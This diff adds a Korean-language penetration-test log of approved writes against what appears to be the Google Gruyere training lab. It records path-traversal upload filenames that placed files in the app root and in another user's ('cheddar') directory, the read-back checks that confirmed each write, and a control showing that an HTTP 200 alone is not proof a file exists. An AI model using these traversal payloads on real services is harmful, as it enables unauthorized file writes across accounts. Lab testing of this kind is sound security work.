@@ -1,0 +1,18 @@
+# Round 6 후속 — 승인받은 쓰기 실행 결과 (2026-09-28T10:20Z)
+
+## (A) 앱 루트 쓰기  filename=../../r6_root_proof.txt
+File uploaded
+accessible at:</b> https://google-gruyere.appspot.com/399820027374159079597995648128134925001/brie/../../r6_root_proof.txt
+→ 읽기 검증 GET /<gid>/%2e%2e%2fr6_root_proof.txt :
+R6-ROOT-WRITE-PROOF-20260928T1020Z
+
+## (B) 타 계정(cheddar) 디렉터리 쓰기  filename=../cheddar/r6_probe.txt
+File uploaded
+accessible at:</b> https://google-gruyere.appspot.com/399820027374159079597995648128134925001/brie/../cheddar/r6_probe.txt
+→ 읽기 검증 GET /<gid>/cheddar/r6_probe.txt :
+R6-CHEDDAR-DIR-WRITE-PROOF-20260928T1020Z
+
+## 대조군 (오라클 검증)
+GET /<gid>/cheddar/zzz_absent.txt → 200 이지만 본문은 Error
+   Invalid request: /cheddar/zzz_absent.txt
+→ 즉 200 은 존재 신호가 아니다. 위 두 양성 결과는 '본문이 내가 쓴 문자열과 일치'로 판정했다.
